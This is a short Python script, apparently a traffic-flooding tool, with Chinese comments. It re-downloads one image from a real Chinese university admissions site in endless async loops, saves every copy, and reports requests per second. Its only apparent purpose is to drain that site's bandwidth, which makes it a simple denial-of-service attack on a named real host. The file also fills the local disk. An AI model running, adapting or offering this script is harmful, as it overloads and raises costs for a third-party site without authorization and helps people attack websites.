import aiofiles
import aiohttp
import asyncio
import os
import uuid
from datetime import datetime

# 配置项
TARGET_URL = "https://zsb.qzuie.edu.cn/uploadfile/d/file/p/2021/07/07/877e30f504e6c3c95505218e9026c4e6.png"
CONCURRENCY = 1000000  # 总并发协程数
WORKERS = 5  # Worker进程数
TIMEOUT = 30  # 超时时间（秒）
SAVE_DIR = "./downloads"  # 文件保存目录


# 状态统计
class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.start_time = datetime.now()


stats = Stats()


async def download_file(session, semaphore):
    async with semaphore:
        try:
            async with session.get(TARGET_URL, timeout=TIMEOUT) as response:
                content = await response.read()

                # 保存文件
                filename = os.path.join(SAVE_DIR, f"{uuid.uuid4().hex}.webp")
                async with aiofiles.open(filename, "wb") as f:
                    await f.write(content)

                stats.total += 1
                stats.success += 1
                print(f"[Success] Count: {stats.total} | Size: {len(content)} bytes | Saved: {filename}")

                return len(content)

        except Exception as e:
            stats.total += 1
            stats.failed += 1
            print(f"[Failed] Count: {stats.total} | Error: {str(e)}")
            return 0


async def worker(semaphore):
    async with aiohttp.ClientSession() as session:
        while True:
            await download_file(session, semaphore)


async def monitor():
    while True:
        await asyncio.sleep(5)
        duration = (datetime.now() - stats.start_time).total_seconds()
        print(f"\n[Status] Runtime: {duration:.1f}s | "
              f"Total: {stats.total} | Success: {stats.success} | "
              f"Failed: {stats.failed} | RPS: {stats.total / duration:.1f}\n")


def init_env():
    os.makedirs(SAVE_DIR, exist_ok=True)
    print(f"Download directory: {os.path.abspath(SAVE_DIR)}")


if __name__ == "__main__":
    init_env()

    # 创建信号量控制并发
    semaphore = asyncio.Semaphore(CONCURRENCY)

    loop = asyncio.get_event_loop()

    # 启动监控任务
    loop.create_task(monitor())

    # 启动工作进程
    workers = [loop.create_task(worker(semaphore)) for _ in range(WORKERS)]

    try:
        loop.run_forever()
    except KeyboardInterrupt:
        print("\nShutting down...")
        for task in workers:
            task.cancel()
        loop.close()